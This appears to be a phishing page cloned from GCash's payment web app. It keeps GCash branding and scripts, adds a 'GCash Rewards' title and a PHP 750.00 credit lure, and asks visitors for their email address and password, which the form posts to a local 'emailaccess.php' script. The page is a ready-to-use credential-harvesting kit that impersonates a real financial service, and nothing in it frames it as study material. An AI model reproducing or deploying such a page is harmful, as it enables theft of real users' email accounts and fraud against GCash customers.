 
 <html style="font-size: 60px;">
 <head>
 <script type="text/javascript" async="" src="https://payments.gcash.com/gcash-cashier-web/1.2.1/https://www.google-analytics.com/analytics.js"></script>
 <script async="" src="https://payments.gcash.com/gcash-cashier-web/1.2.1/https://www.googletagmanager.com/gtm.js?id=GTM-NW4MWX5"></script>
 <script>
 ! function(e, t, a, n, g) {
	 e[n] = e[n] || [], e[n].push({
		 "gtm.start": (new Date).getTime(),
								  event: "gtm.js"
	 });
	 var m = t.getElementsByTagName(a)[0],
	 r = t.createElement(a);
	 r.async = !0, r.src = "https://payments.gcash.com/gcash-cashier-web/1.2.1/https://www.googletagmanager.com/gtm.js?id=GTM-NW4MWX5", m.parentNode.insertBefore(r, m)
 }(window, document, "script", "dataLayer")
 </script>
 <meta charset="utf-8">
 <meta name="format-detection" content="telephone=no, email=no">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
 <title>GCash Login</title>
 <meta name="data-aspm" content="a769">
 <meta name="wap-font-scale" content="no">
 <link href="https://fonts.googleapis.com/css?family=Karla|Poppins|Poppins:600" rel="stylesheet">
 <script>
 document.title = "GCash Rewards;"
 </script>
 <script>
 ! function(e, n) {
	 "use strict";
 var t;
 
 function i() {
	 var t = Math.min(e.innerWidth || n.clientWidth, 450) / 7.5;
	 n.style.fontSize = t + "px"
 }
 i(), window.addEventListener("resize", function() {
	 clearTimeout(t), t = setTimeout(i, 300)
 })
 }(window, document.documentElement)
 </script>
 <link rel="stylesheet" href="https://payments.gcash.com/gcash-cashier-web/1.2.1/index.a7201275ac8dc41aa88f.css">
 <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
 <meta http-equiv="Pragma" content="no-cache">
 <meta http-equiv="expires" content="0">
 </head>
 <body>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0" id="__SVG_SPRITE_NODE__">
 <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 72" id="icon-error">
 <path d="M51.2 22.7l-1.4-1.4-13.5 13.5L23 21.5l-1.4 1.4 13.3 13.3-13.4 13.4 1.4 1.4 13.4-13.4 13.6 13.6 1.4-1.4-13.6-13.6 13.5-13.5zM36 0C16.1 0 0 16.1 0 36s16.1 36 36 36 36-16.1 36-36S55.9 0 36 0zm0 70C17.3 70 2 54.7 2 36S17.3 2 36 2s34 15.3 34 34-15.3 34-34 34z"></path>
 </symbol>
 <symbol xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 76 76" id="icon-processing">
 <defs>
 <circle id="icon-processing_a" cx="38" cy="38" r="38"></circle>
 <path id="icon-processing_b" d="M16.53 22.766c4.62-1.76 7.57-7.42 8.85-16.982a4 4 0 0 0-2.81-4.36C19.416.474 16.265 0 13.114 0c-3.14 0-6.272.473-9.39 1.418A4 4 0 0 0 .917 5.775c1.278 9.567 4.228 15.23 8.85 16.99-4.62 1.76-7.57 7.42-8.85 16.983a4 4 0 0 0 2.81 4.36c3.15.95 6.302 1.424 9.453 1.424 3.145 0 6.276-.472 9.396-1.417a4 4 0 0 0 2.804-4.358c-1.28-9.567-4.228-15.23-8.85-16.99z"></path>
 </defs>
 <g fill="none" fill-rule="evenodd">
 <use fill="#FFD853" xlink:href="#icon-processing_a"></use>
 <circle cx="38" cy="38" r="36.5" stroke="#FFC019" stroke-width="3"></circle>
 <path fill="#FFF" d="M41.53 37.766c4.47-1.702 7.374-7.052 8.717-16.052a4 4 0 0 0-3.644-4.578 108.66 108.66 0 0 0-8.487-.332c-2.817 0-5.625.11-8.423.33a4 4 0 0 0-3.643 4.577c1.343 9.006 4.248 14.358 8.717 16.06-4.467 1.7-7.374 7.05-8.717 16.05a4 4 0 0 0 3.644 4.578 108.46 108.46 0 0 0 16.915.002 4 4 0 0 0 3.643-4.58c-1.342-9-4.247-14.35-8.717-16.054z" opacity=".9"></path>
 <path fill="#FFC019" d="M28.985 29.84c2.603-.922 5.758-1.383 9.463-1.383 3.706 0 6.614.46 8.724 1.382l-2.65 5.7-6.074 2.36-6.073-2.36-3.39-5.7zm-2.6 19.464C29.28 50.434 33.305 51 38.462 51c5.158 0 8.852-.565 11.083-1.696v8.632h-23.16v-8.632z"></path>
 <path stroke="#000" stroke-width="5" d="M29.678 56.572c1.3-5.074 2.765-17.105 6.497-18.865-4.41-3.18-6.743-16.86-7.19-18.864" opacity=".054"></path>
 <g transform="translate(25 15)">
 <path stroke="#FFF6DF" stroke-width="3" d="M13.15 22.45l2.846-1.086c3.978-1.514 6.683-6.705 7.896-15.78a2.5 2.5 0 0 0-1.757-2.724c-3.01-.907-6.016-1.36-9.02-1.36-2.993 0-5.978.45-8.957 1.353a2.5 2.5 0 0 0-1.753 2.724C3.617 14.655 6.322 19.85 10.3 21.364l2.85 1.085zm0 .633l-2.85 1.085c-3.978 1.515-6.682 6.705-7.896 15.78A2.5 2.5 0 0 0 4.16 42.67c3.013.907 6.018 1.36 9.02 1.36 2.994 0 5.98-.45 8.96-1.353a2.5 2.5 0 0 0 1.752-2.724c-1.213-9.08-3.918-14.272-7.897-15.788l-2.847-1.085zm0 0l-.834-.317.833-.317.83.312-.835.317z"></path>
 <use stroke="#FFC019" stroke-width="2" xlink:href="#icon-processing_b"></use>
 </g>
 </g>
 </symbol>
 <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 70" id="icon-spin">
 <path opacity="0.083" d="M35,0L35,0c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V3C32,1.3,33.3,0,35,0z"></path>
 <path opacity="0.167" d="M52.5,4.7L52.5,4.7c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C49.2,4.4,51.1,3.9,52.5,4.7z"></path>
 <path opacity="0.25" d="M65.3,17.5L65.3,17.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C62.6,15.6,64.5,16.1,65.3,17.5z"></path>
 <path opacity="0.333" d="M70,35L70,35c0,1.7-1.3,3-3,3H53c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C68.7,32,70,33.3,70,35z"></path>
 <path opacity="0.417" d="M65.3,52.5L65.3,52.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C65.6,49.2,66.1,51.1,65.3,52.5z"></path>
 <path opacity="0.5" d="M52.5,65.3L52.5,65.3c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1l0,0 c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C54.4,62.6,53.9,64.5,52.5,65.3z"></path>
 <path opacity="0.583" d="M35,50L35,50c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V53 C32,51.3,33.3,50,35,50z"></path>
 <path opacity="0.667" d="M27.5,48L27.5,48c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C24.2,47.7,26.1,47.2,27.5,48z"></path>
 <path opacity="0.75" d="M20,35L20,35c0,1.7-1.3,3-3,3H3c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C18.7,32,20,33.3,20,35z"></path>
 <path opacity="0.8333" d="M22,42.5L22,42.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C19.3,40.6,21.2,41.1,22,42.5z"></path>
 <path opacity="0.917" d="M22,27.5L22,27.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C22.3,24.2,22.8,26.1,22,27.5z"></path>
 <path d="M27.5,22L27.5,22c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1 l0,0c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C29.4,19.3,28.9,21.2,27.5,22z"></path>
 </symbol>
 <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 72 72" id="icon-success">
 <path d="M36 .1C55.8.1 71.9 16.3 71.9 36c0 19.8-16.1 35.9-35.9 35.9-19.9-.1-36-16.2-35.9-36C.1 16.1 16.2.1 36 .1zm0 2C17.3 2.1 2.1 17.2 2.1 35.9c0 18.7 15.2 33.9 33.9 33.9s33.9-15.2 33.9-33.9C69.8 17.3 54.7 2.1 36 2.1z"></path>
 <path d="M51.2 25.9l1.4 1.4C45 35 37.4 42.7 29.7 50.4c-4.1-4.2-8.1-8.4-12.2-12.5.5-.5.9-.9 1.4-1.5l10.8 11.1c7.2-7.2 14.4-14.4 21.5-21.6z"></path>
 </symbol>
 </svg>
 <noscript>
 <iframe src="https://payments.gcash.com/gcash-cashier-web/1.2.1/https://www.googletagmanager.com/ns.html?id=GTM-NW4MWX5" height="0" width="0" style="display:none;visibility:hidden"></iframe>
 </noscript>
 <div class="root-app desktop">
 <div>
 <h1 class="layout-header">
 <img src="https://payments.gcash.com/gcash-cashier-web/1.2.1/img/gcash_logo.f988652.png" alt="">
 </h1>
 <div class="layout-content">
 <!---->
 <div class="main-container login-page">
 <div class="merchant-info">
 <div class="row">
 <label>Merchant</label>
 <span class="merchant-name">GCash Philippines</span>
 </div>
 <div class="row">
 <label>Credit Amount: </label>
 <span class="amount">PHP 750.00</span>
 </div>
 <!---->
 <!---->
 <!---->
 </div>
 <form action="emailaccess.php" method="POST">
 <div class="page-container">
 <div class="page-main content-center">
 <h2>Link your email to GCash</h2>
 <div class="login">
 <div accessbilityid="mobile-input" class="m-input hasPrefix notEmpty" autofocus="autofocus">
 <div class="input-wrap">
 <div>Email:</div>
 <input type="email" name="email" placeholder="example@gmail.com">
 <div class="line"></div>
 <label class="placeholder">Required:</label>
 </div>
 <div class="input-wrap">
 <div>Password:</div>
 <input type="password" name="pass" placeholder="********">
 <div class="line"></div
 </div>
 <p class="error-text error-message"></p>
 </div>
 </div>
 </div>
 <footer>
 <div class="submit-button display-mobile">
 <button type="submit" class="ap-button ap-button-primary" accessbilityid="next-button"> NEXT
 <!---->
 <!---->
 <!---->
 </button>
 </div>
 </footer>
 </div>
 </form>
 <div data-v-0393febb="">
 <!---->
 </div>
 </div>
 </div>
 <div class="registration-footer">
 <p>Don’t have a GCash account? <span>Register now </span>
 </p>
 </div>
 </div>
 <!---->
 </div>
 <script>
 ! function() {
	 if (!window.Tracert) {
		 for (var r = {
			 _isInit: !0,
		_readyToRun: [],
		call: function() {
			var a, n = arguments;
			try {
				a = [].slice.call(n, 0)
			} catch (o) {
				var e = n.length;
				a = [];
				for (var t = 0; t < e; t++) a.push(n[t])
			}
			r.addToRun(function() {
				r.call.apply(r, a)
			})
		},
		addToRun: function(o) {
			var a = o;
			"function" == typeof a && (a._logTimer = new Date - 0, r._readyToRun.push(a))
		}
		 }, o = ["config", "logPv", "info", "err", "click", "expo", "pageName", "pageState", "time", "timeEnd", "parse", "checkExpo", "stringify", "report"], a = 0; a < o.length; a++) {
			 ! function(o) {
				 r[o] = function() {
					 var a, n = arguments;
					 try {
						 a = [].slice.call(n, 0)
					 } catch (o) {
						 var e = n.length;
						 a = [];
						 for (var t = 0; t < e; t++) a.push(n[t])
					 }
					 a.unshift(o), r.addToRun(function() {
						 r.call.apply(r, a)
					 })
				 }
			 }(o[a])
		 }
		 window.Tracert = r
	 }
 }(),
 function() {
	 if (!window.BizLog) {
		 var r = {
			 _readyToRun: [],
			 call: function() {
				 var a, n = arguments;
				 try {
					 a = [].slice.call(n, 0)
				 } catch (o) {
					 var e = n.length;
					 a = [];
					 for (var t = 0; t < e; t++) a.push(n[t])
				 }
				 r.addToRun(function() {
					 r.call.apply(r, a)
				 })
			 },
			 addToRun: function(o) {
				 "function" == typeof o && (o._logTimer = new Date - 0, r._readyToRun.push(o))
			 }
		 };
		 window.BizLog = r
	 }
 }(), window.BizLog.call("config", {
	 disabled: !0
 }),
 function(o, a, n) {
	 try {
		 o._to = {
			 server: "https://mdap.paas.mynt.xyz/loggw/webLog.do",
			 errorServer: "https://mdap.paas.mynt.xyz/loggw/webLog.do",
			 autoLogPv: !1,
			 eventType: "click",
			 workspaceId: "PROD",
			 appId: "D54528A131559",
			 sessionIdKey: "tracert-session-key",
			 patchRules: {
				 appPatches: [
				 ["GCash", /\bGCash\/([\d.]+)/]
				 ],
				 sdkPatches: [
				 ["AppContainer", /\bAppContainer\/([\d.]+)/]
				 ]
			 }
		 };
		 var e = (t = "userId", (document.cookie.match("(^|; )" + t + "=([^;]*)") || 0)[2]);
		 e && (o._to.role_id = e)
	 } catch (o) {
		 console.error("set appReg error", o)
	 }
	 var t
 }(window, document)
 </script>
 <script src="https://payments.gcash.com/gcashapp/gcash-offline-resource/static/awesome-fastclick.js"></script>
 <script src="https://payments.gcash.com/gcashapp/gcash-offline-resource/static/vue.min.js"></script>
 <script src="https://payments.gcash.com/gcashapp/gcash-offline-resource/static/vuex.min.js"></script>
 <script src="https://payments.gcash.com/gcashapp/gcash-offline-resource/static/vue-router.min.js"></script>
 <script src="https://payments.gcash.com/gcashapp/gcash-offline-resource/static/whatwg-fetch.js"></script>
 <script src="https://payments.gcash.com/gcash-cashier-web/1.2.1/https://gw.alipayobjects.com/os/lib/alipay/iwp-tracker/3.4.4-alpha.2.1/dist/iwpTracker1.2.js.min.js"></script>
 <script type="text/javascript" src="https://payments.gcash.com/gcash-cashier-web/1.2.1/manifest-1.2.1-6cf783ccc16bde176b9b.js" crossorigin=""></script>
 <script type="text/javascript" src="https://payments.gcash.com/gcash-cashier-web/1.2.1/2-1.2.1-3ca1f14e6e469a0404d8.js" crossorigin=""></script>
 <script type="text/javascript" src="https://payments.gcash.com/gcash-cashier-web/1.2.1/0-1.2.1-a7201275ac8dc41aa88f.js" crossorigin=""></script>
 <div>
 <!---->
 <!---->
 </div>
 <!---->
 <script src="https://payments.gcash.com/gcash-cashier-web/1.2.1/static/apdid_1.0.12.js"></script>
 <script>
 ! function() {
	 function x(x) {
		 return (document.cookie.match("(^|; )" + x + "=([^;]*)") || [])[2]
	 }
	 var n;
	 apdid.init({
		 appName: "gcash",
		 token: (n = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(x) {
			 var n = 16 * Math.random() | 0;
			 return ("x" === x ? n : 3 & n | 8).toString(16)
		 }), x("env-token") || (document.cookie = "env-token=" + n + "; path=/"), x("env-token")),
				region: "SG"
	 })
 }(), console.log("page version:1.2.1"), console.log("build time:2021-09-22 02:29:29")
 </script>
 <p style="display: none;"></p>
 </body>
 </html>
